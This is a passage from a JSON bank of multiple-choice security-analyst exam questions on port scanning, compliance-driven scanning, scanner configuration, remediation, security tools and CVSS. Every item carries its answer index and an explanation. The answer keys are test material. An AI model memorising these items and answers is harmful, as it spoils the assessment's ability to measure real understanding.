verifies the firewall rule.","Nmap sends an ICMP Echo Request; the target returns an ICMP Port Unreachable packet."],"a":1,"e":"The <code>-sS</code> switch specifies a TCP SYN (half-open) scan. Nmap sends a SYN packet. If the port is open, the target replies with SYN/ACK. Rather than completing the connection with an ACK, Nmap immediately sends an RST (Reset) packet to tear down the embryonic connection before it is logged by application-level software.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:6","set":"lq","ch":5,"d":2,"q":"A security auditor needs to run an automated vulnerability assessment check using Nmap against discovered web and database services on an internal server. Which Nmap Scripting Engine (NSE) syntax should the auditor execute?","o":["<code>nmap -sA --script brute target</code>","<code>nmap -sT --script discovery target</code>","<code>nmap -sV --script vuln target</code>","<code>nmap -sn --script auth target</code>"],"a":2,"e":"The NSE category <code>vuln</code> (invoked via <code>--script vuln</code>) runs vulnerability detection scripts against discovered services, cross-referencing known CVEs and software flaws. Combining it with <code>-sV</code> ensures service versions are properly identified before running the vulnerability checks.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:7","set":"lq","ch":5,"d":2,"q":"An analyst reviews an Nmap scan of an unidentified host and observes open TCP ports 135, 139, and 445. What operating system family and services do these ports STRONGLY indicate?","o":["Linux operating system running Apache, MySQL, and Postfix","Microsoft Windows running MSRPC, NetBIOS, and SMB directory services","Cisco IOS running BGP, OSPF, and SNMP","FreeBSD operating system running BIND, OpenSSH, and NFS"],"a":1,"e":"The combination of TCP port 135 (Microsoft RPC endpoint mapper), TCP port 139 (NetBIOS Session Service), and TCP port 445 (Microsoft SMB over IP) is the definitive network signature of a Microsoft Windows operating system.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c5-portscan:8","set":"lq","ch":5,"d":2,"q":"During a scheduled network asset discovery audit, an analyst identifies an undocumented IP address on the secure datacenter server VLAN. An OUI lookup on the MAC address reveals the hardware vendor is \"Raspberry Pi Foundation\". What is the NEXT logical step the analyst should take?","o":["Add the MAC address to the static DHCP reservation pool to guarantee persistent IP addressing.","Execute an aggressive Masscan across the entire Class A corporate network to detect peer nodes.","Configure the vulnerability scanner to suppress all future alerts originating from this MAC address.","Query network switch CAM tables to identify the physical port and dispatch a technician to investigate a rogue hardware implant."],"a":3,"e":"Discovering an unauthorized, low-cost embedded computing device (like a Raspberry Pi) connected to a sensitive server VLAN strongly indicates a rogue device, unauthorized shadow IT, or a physical drop-box implant installed by an adversary or penetration tester. The analyst must immediately locate the physical switch and port via Content Addressable Memory (CAM/MAC) table queries, quarantine the port (or disable it), and physically inspect the location. Option B is tempting because scanning maps adjacent devices, but running high-speed scans does not secure the compromised server segment. Options A and C legitimize or blind defenses to an unverified rogue hardware device.","l":"c5-portscan","l2":"","k":""},{"id":"lq:c6-requirements:1","set":"lq","ch":6,"d":2,"q":"A security analyst finishes patching a critical remote code execution vulnerability on an internal ERP application server. The system administrator requests that the remediation ticket be closed immediately to meet SLA deadlines. According to the vulnerability management lifecycle, which phase must be completed before the ticket can be closed?","o":["Analysis","Verification","Discovery","Reporting"],"a":1,"e":"The Verification phase confirms that the applied patch or configuration change successfully eliminated the vulnerability without introducing regressions. A remediation ticket must never be closed without running a confirmatory scan to verify resolution.","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:2","set":"lq","ch":6,"d":2,"q":"A merchant bank processes credit card transactions within a dedicated cardholder data environment (CDE). Which of the following scanning practices is explicitly MANDATED to maintain compliance with PCI DSS Requirement 11.3?","o":["Conducting annual non-credentialed scans against internal database servers","Executing daily passive network packet captures across all DMZ firewalls","Performing quarterly external scans using a PCI SSC Approved Scanning Vendor (ASV)","Auditing cloud serverless configurations against the ISO 27001 framework monthly"],"a":2,"e":"PCI DSS Requirement 11.3 mandates quarterly external vulnerability scans conducted by an independent Approved Scanning Vendor (ASV) certified by the PCI Security Standards Council (PCI SSC), alongside quarterly internal scans and scans after significant changes.","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:3","set":"lq","ch":6,"d":2,"q":"An organization is deploying 200 new virtual servers. While all systems have installed the latest operating system security hotfixes, the security architect wants to ensure the servers comply with hardened configuration guidelines by disabling unnecessary services, enforcing password complexities, and restricting administrative privileges. Which standard should the architect use for baseline configuration scanning?","o":["CIS Benchmarks","FIPS 199","PCI DSS Requirement 11","NIST SP 800-137"],"a":0,"e":"CIS Benchmarks are prescriptive, consensus-based technical configuration guides designed to harden operating systems, applications, and cloud environments against misconfigurations. A system can be fully patched against CVEs while still failing basic configuration baselines.","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:4","set":"lq","ch":6,"d":2,"q":"A vulnerability scan conducted during normal operating hours caused an internal customer support database to freeze and drop active connections, resulting in a three-hour service disruption. What adjustment should the security team implement to prevent future operational impacts?","o":["Reschedule scans to low-traffic maintenance windows and reduce scanner throttle settings for concurrent target checks.","Switch from credentialed vulnerability scanning to aggressive unprivileged TCP Connect scans.","Disable vulnerability scanning on all database instances and rely solely on perimeter WAF logs.","Increase scanner transmission packet rates to complete the assessment before business hours resume."],"a":0,"e":"To avoid disrupting production operations, scans should be scheduled during low-traffic maintenance windows (such as weekend nights) and configured with scanner throttling (limiting the number of concurrent target hosts and parallel checks per host) to reduce CPU and network overhead.","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:5","set":"lq","ch":6,"d":2,"q":"A security engineer must assess the vulnerability posture of networked infusion pumps and patient monitoring equipment in an active intensive care hospital wing. Which scanning methodology is the SAFEST and MOST appropriate choice?","o":["Active credentialed vulnerability scanning via SSH and WMI","External penetration testing using Metasploit auxiliary scanner modules","Aggressive discovery scanning using Nmap with the <code>-A -T5</code> flags","Passive network monitoring via a network TAP or switch SPAN port"],"a":3,"e":"Biomedical and clinical equipment can suffer catastrophic malfunctions or reboots when subjected to active network probing. Passive network monitoring silently analyzes passing network traffic without injecting any packets, identifying active devices and software versions safely.","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:6","set":"lq","ch":6,"d":2,"q":"A legacy accounting application running on an unsupported Windows Server 2008 host has a critical unpatchable vulnerability. The vendor no longer produces security updates. The security team isolates the server onto a dedicated VLAN with strict firewall ACLs and places a reverse proxy with virtual patching rules in front of the application. In this scenario, what action did the security team take?","o":["Remediation","Mitigation","Discovery","Verification"],"a":1,"e":"Mitigation applies compensating controls (network isolation, VLAN segmentation, and reverse proxy virtual patching) that reduce the risk or exploitability of a weakness without removing the underlying flaw. Remediation would require completely eliminating the vulnerability (such as upgrading the OS or patching the binary).","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:7","set":"lq","ch":6,"d":2,"q":"A federal government information system undergoes FIPS 199 categorization. Security officers determine that an unauthorized disclosure of system data would cause a severe or catastrophic adverse effect on agency operations, leading to major mission failure. What impact level should be assigned to the system's confidentiality?","o":["Low impact","Moderate impact","Critical impact","High impact"],"a":3,"e":"Under FIPS 199, an impact is categorized as 'High' if the loss of confidentiality, integrity, or availability causes a severe or catastrophic adverse effect on organizational operations, organizational assets, or individuals (such as mission failure or loss of life).","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-requirements:8","set":"lq","ch":6,"d":2,"q":"A healthcare provider subject to the HIPAA Security Rule seeks to determine how frequently vulnerability scans must be conducted across its patient database infrastructure. What does HIPAA mandate regarding vulnerability scanning frequency?","o":["Mandatory monthly internal scans and bi-annual external ASV scans","Daily automated continuous scanning of all electronic Protected Health Information systems","Regular, documented vulnerability evaluations based on organizational risk assessments without a rigid calendar mandate","Annual vulnerability scans certified by the Department of Health and Human Services"],"a":2,"e":"Unlike PCI DSS (which mandates a strict quarterly schedule), HIPAA requires regular, risk-based vulnerability reviews and technical evaluations accompanied by documented risk analysis and remediation, without prescribing a rigid calendar frequency.","l":"c6-requirements","l2":"","k":""},{"id":"lq:c6-config:1","set":"lq","ch":6,"d":2,"q":"A security analyst conducts a non-credentialed vulnerability scan against an internal Linux server, and the report flags a critical CVE in the OpenSSH package based on the banner <code>OpenSSH 7.4p1</code>. However, the system administrator confirms that security patches were applied via backporting and the flaw does not exist. What type of scanning error occurred, and how can the security team prevent this in future scans?","o":["False negative; switch to external non-credentialed scanning.","False positive; configure credentialed scanning to inspect local package versions directly.","Scan timeout error; increase scanner network throttling packet limits.","Configuration drift; deploy an agentless TCP ACK scan across the subnet."],"a":1,"e":"A false positive occurred because the non-credentialed scan guessed vulnerability status based purely on public banner text. Credentialed scanning logs into the host and queries the package manager directly, recognizing backported patches and eliminating false positives.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:2","set":"lq","ch":6,"d":2,"q":"An enterprise organization with 5,000 remote employees operating company-owned laptops across multiple home networks and co-working spaces struggles with vulnerability visibility. Monthly network scans consistently fail to assess more than 60% of the fleet. Which scanning architecture should the organization implement to achieve comprehensive coverage?","o":["Agent-based vulnerability scanning","Centralized agentless network scanning via VPN","Quarterly external ASV scanning","Passive network packet monitoring"],"a":0,"e":"Agent-based scanning installs lightweight software on each endpoint that executes scans locally from the inside out and uploads telemetry whenever internet access is present. This completely eliminates reliance on network scan windows and corporate LAN connectivity for remote workers.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:3","set":"lq","ch":6,"d":2,"q":"A security engineer configures an enterprise vulnerability scanner for a scheduled scan of an Active Directory domain environment consisting exclusively of Windows Server 2022 and Windows 11 systems. To optimize scanning speed and minimize false positives, what configuration adjustment should the engineer make?","o":["Enable all destructive plug-ins to verify exploitability.","Disable all credentialed authentication checks to reduce network traffic.","Disable plug-in families for non-Windows operating systems such as Cisco IOS, AIX, and HP-UX.","Set the Nmap timing template to -T0 (Paranoid)."],"a":2,"e":"Disabling irrelevant plug-in families (such as checks for AIX, Solaris, HP-UX, or Cisco network hardware that are absent from the environment) prevents the scanner from executing thousands of unnecessary probes, dramatically reducing scan duration and preventing false alerts.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:4","set":"lq","ch":6,"d":2,"q":"A water utility authority requires a vulnerability assessment of its operational technology (OT) network controlling municipal water filtration valves and chemical dosing pumps. What scanning methodology is MANDATORY in this environment to prevent catastrophic operational disruption?","o":["Credentialed active WMI scanning during maintenance windows","High-speed Masscan sweeps throttled to 50,000 packets per second","Non-credentialed active TCP SYN scanning","Passive network monitoring and traffic analysis using specialized OT security tools"],"a":3,"e":"Industrial control systems (ICS/SCADA) and programmable logic controllers (PLCs) utilize sensitive serial and network stacks that can easily crash when probed by active network scanners. Passive network traffic analysis (using purpose-built OT tools like Claroty, Dragos, or Nozomi) is mandatory to assess vulnerabilities without injecting packets.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:5","set":"lq","ch":6,"d":2,"q":"An organization must comply with federal security automation guidelines. The security team prepares automated configuration checklists using an XML-based format that specifies security benchmarks, while relying on a separate XML language to define the low-level machine testing procedures that query registry keys and file hashes. Which two SCAP specifications are being used?","o":["XCCDF for the benchmark checklist and OVAL for the low-level machine test procedures","CCE for the checklist and CPE for the low-level tests","CVSS for the checklist and CVE for the low-level tests","OVAL for the benchmark checklist and XCCDF for the low-level tests"],"a":0,"e":"In the NIST SCAP framework, XCCDF (Extensible Configuration Checklist Description Format) is the XML language used to author and structure security checklists and configuration benchmarks. OVAL (Open Vulnerability and Assessment Language) encodes the low-level technical tests (querying registry, file system, or package states) that validate compliance with XCCDF rules.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:6","set":"lq","ch":6,"d":2,"q":"A security administrator needs to configure credentialed vulnerability scanning across 100 mission-critical database servers. In accordance with security best practices, what operational constraints should be applied to the scanner service account?","o":["Add the service account to the local Administrators group with interactive GUI logon rights across all target servers.","Assign least-privilege read-only permissions, disable interactive GUI logons, and rotate credentials regularly.","Store the plaintext service credentials in an unencrypted script on the scanner appliance to facilitate unattended cron jobs.","Delegate unrestricted Active Directory domain replication rights to allow deep schema auditing."],"a":1,"e":"Vulnerability scanner service accounts are highly privileged assets that present significant attack surface if compromised. Best practices dictate assigning strictly read-only, least-privilege permissions necessary to query operating system configurations and registry keys, disabling interactive GUI logons (denying local desktop sessions), rotating credentials on a strict schedule, and storing credentials inside a secure PAM vault. Option A is tempting because administrative rights ensure comprehensive scan results, but granting interactive local administrator rights allows an attacker who compromises the scanner to log into target databases with full control. Option C exposes credentials on disk, and Option D grants dangerous domain-level replication rights.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:7","set":"lq","ch":6,"d":2,"q":"An external vulnerability scan report shows no open ports or services on a public web server, despite the web server being fully accessible to customers over the Internet via HTTPS. What is the MOST likely cause of this discrepancy?","o":["The web server utilizes an agent-based scanner that suppresses external scan results.","The web server operates on ephemeral ports that cannot be detected by external scanners.","An intermediate firewall, WAF, or CDN is filtering scanner probes or blocking the scanner IP address.","The vulnerability scanner's SCAP feed failed to synchronize its OVAL definitions."],"a":2,"e":"Intermediary network devices, such as next-generation perimeter firewalls, Web Application Firewalls (WAF), or Content Delivery Networks (CDNs), frequently drop or filter unauthorized port probes from unknown external IP addresses, causing target services to appear closed or filtered to external scanners.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-config:8","set":"lq","ch":6,"d":2,"q":"In an AWS cloud environment, a security architect wants to implement continuous, credentialed-style vulnerability scanning across hundreds of auto-scaling EC2 virtual machines without managing SSH keys or opening inbound network management ports. Which solution BEST fulfills these requirements?","o":["Deploy an external Nessus appliance scanning over the public Internet.","Install an on-premises vulnerability scanner and establish an IPsec VPN tunnel.","Configure a centralized Bastion host with administrative SSH credentials pushed via cron.","Enable AWS Inspector utilizing the native AWS Systems Manager (SSM) Agent and IAM instance roles."],"a":3,"e":"AWS Inspector integrates natively with the AWS Systems Manager (SSM) Agent installed on EC2 instances. Operating via IAM roles and cloud APIs, Inspector performs authenticated, credentialed vulnerability assessments directly from inside the instance without requiring administrative SSH keys, passwords, or open inbound network ports.","l":"c6-config","l2":"","k":""},{"id":"lq:c6-remediation:1","set":"lq","ch":6,"d":2,"q":"A security operations team deploys a critical vendor patch to a pool of production database servers and immediately marks all corresponding vulnerability tickets as resolved. Which phase of the vulnerability management lifecycle was skipped?","o":["Verification","Remediation","Analysis","Discovery"],"a":0,"e":"The verification phase confirms that the remediation was effective through technical re-testing. Closing tickets upon patch deployment without rescanning skips verification.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:2","set":"lq","ch":6,"d":2,"q":"A legacy web application contains an unfixable remote code execution flaw because the vendor is out of business. The security team deploys a web application firewall (WAF) with custom inspection rules to block exploitation attempts. How should this action be categorized?","o":["Remediation","Compensating control","Risk acceptance","Secure coding practice"],"a":1,"e":"Deploying a WAF reduces risk without fixing the underlying application code, making it a compensating control. Remediation permanently closes the vulnerability itself.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:3","set":"lq","ch":6,"d":2,"q":"An administrator applies an emergency operating system security update to a domain controller. When the vulnerability analyst conducts a post-patch targeted rescan, the scanner reports the vulnerability is still present. What is the FIRST action the analyst should take?","o":["Open a support ticket with the scanner vendor reporting a false positive","Grant a temporary 90-day risk acceptance exception to close the finding","Examine the domain controller directly to verify patch installation status and check for a pending reboot","Reconfigure the scanner to execute an uncredentialed network probe"],"a":2,"e":"Before assuming the scanner is flawed, the analyst must verify the patch status on the endpoint itself. Many OS patches require a reboot before replaced files take effect.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:4","set":"lq","ch":6,"d":2,"q":"A cybersecurity analyst must brief executive leadership on the overall progress of the vulnerability management program over the past year. Which metric BEST demonstrates operational improvement?","o":["The gross quantity of informational findings discovered across internal subnets","The total raw count of vulnerability plugin definitions in the scanner library","The number of uncredentialed network ping sweeps completed each week","Mean Time to Remediate (MTTR) broken down by severity tier"],"a":3,"e":"MTTR demonstrates how quickly the team resolves security risks once detected, showing efficiency gains over time. Raw plugin counts and ping sweeps do not reflect program velocity.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:5","set":"lq","ch":6,"d":2,"q":"A company must prioritize two critical findings: an internal database server has a CVSS 9.8 flaw but sits in a non-routable subnet, while an external customer authentication portal has a CVSS 7.5 flaw directly reachable from the internet. Which factor MOST strongly justifies remediating the authentication portal first?","o":["Exposure","Remediation difficulty","Configuration baseline","Regulatory penalties"],"a":0,"e":"Exposure measures accessibility to attackers. The internet-facing authentication portal is directly reachable by untrusted threat actors, whereas the internal database requires prior internal network access.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:6","set":"lq","ch":6,"d":2,"q":"A security engineer implements a network-level compensating control to isolate an unpatchable radiology imaging device. How should the engineer validate that the compensating control is functioning effectively?","o":["Run a standard vulnerability scan and verify the CVE disappears from the report","Simulate unauthorized network traffic against the device to verify the boundary rule drops the connection","Generate a management dashboard and verify the device risk score drops to zero","Reboot the medical imaging device and inspect system startup logs"],"a":1,"e":"Compensating controls do not fix the software, so standard vulnerability scans will still detect the flaw. Validation requires testing whether the control blocks the specific attack traffic.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:7","set":"lq","ch":6,"d":2,"q":"A manufacturing plant experiences repeated operational disruptions and programmable logic controller (PLC) crashes whenever the vulnerability management team initiates active network scanning. Which adjustment should the analyst make FIRST to resolve this issue?","o":["Reconfigure the scanner to execute uncredentialed UDP vulnerability sweeps across the industrial VLAN","Deploy an active intrusion prevention system inline to filter malformed packets reaching the controllers","Tune scan performance settings to reduce probe intensity and coordinate assessments during scheduled maintenance windows","Permanently remove all operational technology (OT) subnets from the enterprise risk register"],"a":2,"e":"Fragile operational technology (OT) and SCADA devices often crash when subjected to standard IT network scans due to fragile network stacks. Tuning scanner performance (lowering packet rates, reducing concurrent host checks, and avoiding aggressive service fingerprinting) and scheduling assessments during planned operational maintenance windows prevents downtime. Removing assets from the risk register or switching to uncredentialed scans does not remediate the vulnerability risk.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-remediation:8","set":"lq","ch":6,"d":2,"q":"A quarterly vulnerability metrics briefing reveals that the organization's total open vulnerability count increased by 25% over the past quarter, despite infrastructure teams remediating hundreds of CVEs on schedule. What contextual data should the analyst present to executive leadership to explain this increase?","o":["The vulnerability scanner plugin feed was rolled back to an earlier historical version","Network engineers disabled 802.1X port authentication across all regional offices","System administrators migrated ticketing workflows from email alerts to an automated ITSM portal","Scan coverage was expanded to include three newly acquired enterprise cloud environments"],"a":3,"e":"An increase in gross vulnerability counts often reflects an expansion of scanning scope or asset discovery (e.g., onboarding newly acquired business units or cloud subscriptions), bringing previously unmonitored systems into the inventory. The analyst must explain the denominator change (more assets assessed) to contextualize the metrics. Disabling 802.1X or modifying ticketing systems does not explain increased vulnerability detections.","l":"c6-remediation","l2":"","k":""},{"id":"lq:c6-tools:1","set":"lq","ch":6,"d":2,"q":"A security analyst needs to rapidly assess an enterprise web application perimeter for a newly announced critical zero-day vulnerability. The analyst has a custom YAML definition file specifying the target HTTP payload and response matchers. Which tool is BEST suited for this scan?","o":["Nuclei","OpenVAS","Prowler","Nikto"],"a":0,"e":"Nuclei is a fast, template-based vulnerability scanner that uses YAML configuration files to define targeted requests and response matchers.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:2","set":"lq","ch":6,"d":2,"q":"During a routine assessment, an analyst discovers that a vulnerability scanner reported a critical remote code execution vulnerability on an internal file server. Before escalating to systems engineering for emergency remediation, which tool should the analyst use to validate exploitability without launching an attack?","o":["Checkov static analyzer","Metasploit auxiliary scanner module","OWASP ZAP AJAX Spider","ScoutSuite API auditor"],"a":1,"e":"Metasploit auxiliary modules allow analysts to enumerate services and perform non-destructive validation to confirm whether a vulnerability is real or a false positive.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:3","set":"lq","ch":6,"d":2,"q":"A DevSecOps engineer wants to block cloud infrastructure deployments if an engineer defines an Amazon S3 bucket with public read permissions in a Terraform template. Which tool should be integrated into the CI/CD pipeline to fulfill this requirement?","o":["Prowler","ScoutSuite","Checkov","Nikto"],"a":2,"e":"Checkov is a purpose-built static analysis tool that inspects Infrastructure as Code (IaC) templates (such as Terraform) pre-deployment and fails builds that violate security policies.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:4","set":"lq","ch":6,"d":2,"q":"An analyst reviews output from a breach attack simulation platform. A simulated LSASS memory dumping technique (T1003.001) is marked as 'Missed'. Local endpoint inspection reveals the EDR agent logged the event, but the SIEM displayed zero alerts. What is the MOST likely root cause?","o":["The target host was running an unsupported operating system build","The EDR agent lacked administrative privileges to terminate the process","The atomic test script failed to clean up temporary testing files","Endpoint event logs were not forwarded to the SIEM or correlation rules were missing"],"a":3,"e":"When an endpoint sensor detects an activity locally but the central SIEM has no record, the root cause is a log forwarding failure or missing SIEM correlation rule.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:5","set":"lq","ch":6,"d":2,"q":"A penetration tester wants to test an e-commerce checkout form by manually altering prices and parameter values in HTTP POST requests before they reach the web server. Which tool and component should the tester use?","o":["Burp Suite Repeater","Nikto command-line scanner","Nuclei YAML engine","Caldera Sandcat agent"],"a":0,"e":"Burp Suite Repeater (and Proxy) intercepts HTTP requests and allows testers to manually modify and resend them to evaluate application behavior.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:6","set":"lq","ch":6,"d":2,"q":"A security team needs to audit their AWS environment specifically to measure compliance against the CIS AWS Foundations Benchmark and generate a report for external auditors. Which tool is MOST appropriate?","o":["Atomic Red Team","Prowler","Checkov","Zed Attack Proxy"],"a":1,"e":"Prowler is specialized for AWS configuration and compliance auditing, supporting automated mapping to CIS Benchmarks and regulatory frameworks via the --compliance flag.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:7","set":"lq","ch":6,"d":2,"q":"A security analyst is tasked with evaluating whether the organization's defensive controls can detect a multi-stage intrusion from an advanced persistent threat (APT) actor spanning reconnaissance, credential access, and lateral movement. Which tool is BEST suited for this exercise?","o":["Atomic Red Team","Checkov IaC scanner","MITRE Caldera","Metasploit auxiliary scanner"],"a":2,"e":"MITRE Caldera is an automated adversary emulation platform designed specifically to test defenses by running complex, multi-stage attack chains that emulate real-world APT campaigns across an enterprise network. Option A is the primary trap: Atomic Red Team executes discrete, single-step \"atomic\" tests to validate individual ATT&CK techniques, but does not autonomously chain multi-stage lateral movement campaigns across a network like Caldera. Option B is an Infrastructure as Code static analyzer, and Option D is a penetration testing framework focused on vulnerability exploitation rather than automated APT emulation.","l":"c6-tools","l2":"","k":""},{"id":"lq:c6-tools:8","set":"lq","ch":6,"d":2,"q":"A security team scans a newly built container image in their build pipeline. The tool reports three critical CVEs in the base operating system packages and lists available fixed package versions. Which tool generated this report?","o":["ScoutSuite","OpenVAS","Burp Proxy","Trivy"],"a":3,"e":"Trivy scans container images, filesystems, and Git repositories, identifying CVEs in operating system packages along with installed and fixed versions.","l":"c6-tools","l2":"","k":""},{"id":"lq:c7-cvss:1","set":"lq","ch":7,"d":2,"q":"A security analyst reviews a vulnerability report with the vector <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>. What does this vector indicate regarding the vulnerability exploitability?","o":["It can be exploited remotely across the network without authentication or human intervention","It requires physical access to the device and administrative privileges","It requires an attacker to possess basic domain credentials and execute a local shell","It requires convincing a user to open a malicious email attachment over an adjacent network"],"a":0,"e":"AV:N (Network), AC:L (Low complexity), PR:N (No privileges required), and UI:N (No user interaction) indicate an unauthenticated, zero-click remote exploit.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:2","set":"lq","ch":7,"d":2,"q":"A vulnerability report flags a high-priority database server for remote code execution. The systems engineer insists the server was patched last week. Which section of the scan report should the security analyst examine FIRST to verify the finding?","o":["Qualitative Severity Rating","Scanner Output","See Also references","Plugin publication date"],"a":1,"e":"The Scanner Output section contains the raw technical evidence (such as banner text or registry keys) that proves why the scanner flagged the vulnerability, allowing analysts to detect false positives.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:3","set":"lq","ch":7,"d":2,"q":"An organization discovers two vulnerabilities: Flaw 1 has a CVSS base score of 9.6 and resides on an isolated internal test server. Flaw 2 has a CVSS base score of 7.2 on an external edge router, and threat feeds report an EPSS score of 91% with active exploitation in the wild. Which action should the analyst take FIRST?","o":["Remediate Flaw 1 first because it falls in the Critical severity band","Grant a risk acceptance exception for Flaw 2 due to its High rating","Remediate Flaw 2 first because active exploitation and internet exposure present higher immediate operational risk","Wait 30 days for Flaw 2 EPSS probability to decay before patching"],"a":2,"e":"CVSS measures technical severity, while EPSS and threat intelligence reflect real-world exploitation probability. An exposed, actively exploited flaw presents far higher operational risk than an isolated critical flaw.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:4","set":"lq","ch":7,"d":2,"q":"A vulnerability in a virtualization hypervisor allows a guest virtual machine user to execute arbitrary commands on the underlying physical host operating system. Which CVSS metric value captures this behavior?","o":["Attack Vector: Adjacent (AV:A)","User Interaction: Required (UI:R)","Attack Complexity: Low (AC:L)","Scope: Changed (S:C)"],"a":3,"e":"Scope: Changed (S:C) indicates that an exploited vulnerability in one component impacts resources managed by a different security authority, such as a VM hypervisor escape.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:5","set":"lq","ch":7,"d":2,"q":"A calculated CVSS 3.1 base score produces an unrounded sum of 7.42. Under official CVSS v3.1 specification rules, what is the final published base score and qualitative severity rating?","o":["7.5, High","7.4, Medium","7.5, Critical","7.0, High"],"a":0,"e":"CVSS 3.1 formulas strictly mandate rounding up to the next tenth. 7.42 rounds up to 7.5, which falls squarely in the High qualitative severity band (7.0 to 8.9).","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:6","set":"lq","ch":7,"d":2,"q":"How does the calculation of a CVSS Temporal Score affect the initial CVSS Base Score?","o":["It increases the score when no official vendor patch is currently available","It can reduce or maintain the base score, but never increase it","It recalculates the base score based entirely on asset replacement cost","It replaces the Attack Vector metric with geographic threat location data"],"a":1,"e":"Temporal metrics (Exploit Code Maturity, Remediation Level, Report Confidence) adjust the score based on time factors and can only lower or maintain the Base Score, never increase it.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:7","set":"lq","ch":7,"d":2,"q":"An analyst reviews a CVSS vector ending in <code>C:H/I:N/A:N</code>. What impact does this vulnerability have on the targeted asset?","o":["The system suffers a complete denial-of-service crash","The attacker can modify system database records without restriction","All data confidentiality is compromised, but system state and availability are unaffected","The vulnerability causes memory corruption resulting in intermittent packet drops"],"a":2,"e":"C:H indicates High confidentiality loss (total information disclosure), while I:N and A:N indicate None for integrity and availability impacts.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-cvss:8","set":"lq","ch":7,"d":2,"q":"Which organization develops and maintains the Common Vulnerability Scoring System (CVSS) standard?","o":["Center for Internet Security (CIS)","Internet Engineering Task Force (IETF)","International Organization for Standardization (ISO)","Forum of Incident Response and Security Teams (FIRST)"],"a":3,"e":"FIRST (Forum of Incident Response and Security Teams) is the international non-profit consortium that oversees and maintains the CVSS specification.","l":"c7-cvss","l2":"","k":""},{"id":"lq:c7-validate:1","set":"lq","ch":7,"d":2,"q":"A vulnerability scanner reports that an enterprise web server is vulnerable to remote code execution. Upon manual investigation, the analyst discovers the vendor backported the security fix into the installed package without updating the version banner string. What scan result type does this report represent?","o":["False positive","True positive","False negative","True negative"],"a":0,"e":"A false positive occurs when the scanner reports a vulnerability that does not exist. Banner-based version checking often triggers false positives when vendor packages backport patches.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:2","set":"lq","ch":7,"d":2,"q":"An organization experiences a ransomware outbreak originating from an unpatched server. A review of last week vulnerability scan reports indicates the server was flagged as clean with zero vulnerabilities. Which scan error occurred during the assessment?","o":["True positive","False negative","False positive","True negative"],"a":1,"e":"A false negative occurs when the scanner fails to detect an actual vulnerability on the target, creating false confidence while leaving the system exposed.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:3","set":"lq","ch":7,"d":2,"q":"A security analyst is triaging four findings. Which vulnerability should be selected for the HIGHEST remediation priority?","o":["A CVSS 9.8 flaw on an internal air-gapped test machine with no exploit code available","A CVSS 6.5 informational banner disclosure on an internal development workstation","A CVSS 7.8 flaw on an external VPN gateway listed in the CISA KEV catalog with an EPSS score of 0.82","A CVSS 8.5 flaw on a decommissioned database server scheduled for disposal tomorrow"],"a":2,"e":"The external VPN gateway is publicly exposed, confirmed under active real-world exploitation in CISA KEV, and carries an 82% 30-day exploitation probability, making it the top priority.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:4","set":"lq","ch":7,"d":2,"q":"A critical legacy manufacturing controller cannot be patched due to vendor discontinuation. The security team submits a formal risk exception request. Which element MUST be included for the exception to be considered valid and defensible under regulatory compliance frameworks?","o":["A permanent waiver exempting the manufacturing system from internal audit reviews until hardware retirement","A signed agreement to suppress all future scanner alerts and omit the host from the corporate risk register","An informal verbal concurrence between the plant operations manager and the security lead during shift handover","An explicit expiration date, business justification, compensating controls, and authorized executive sign-off"],"a":3,"e":"A defensible risk exception is never open-ended or informal. Under compliance frameworks (such as PCI DSS, ISO 27001, and NIST CSF), an exception requires clear business justification, an objective assessment of residual risk, documented compensating controls (e.g., network micro-segmentation, strict firewall ACLs), formal executive sign-off, and an explicit expiration date requiring periodic re-evaluation. Option A is the classic compliance trap: permanent waivers are forbidden because technology and threat landscapes change. Options B and C bypass formal governance and create audit non-compliance.","l":"c7-validate","l2":"","k":""},{"id":"lq:c7-validate:5","set":"lq","ch":7,"d":2,"q":"A security operations center reports an alarming increase in analyst turnover and missed incident escalations. An internal audit reveals that 88% of daily security alerts are benign alerts or misclassifications. What condition is this SOC experiencing?","o":["Alert fatigue driven by a high false positive rate","Detection failure driven by a high true positive rate","System compromise driven by excessive true negatives","Compliance violation driven by low alert volume"],"a":0,"e":"A high false positive rate 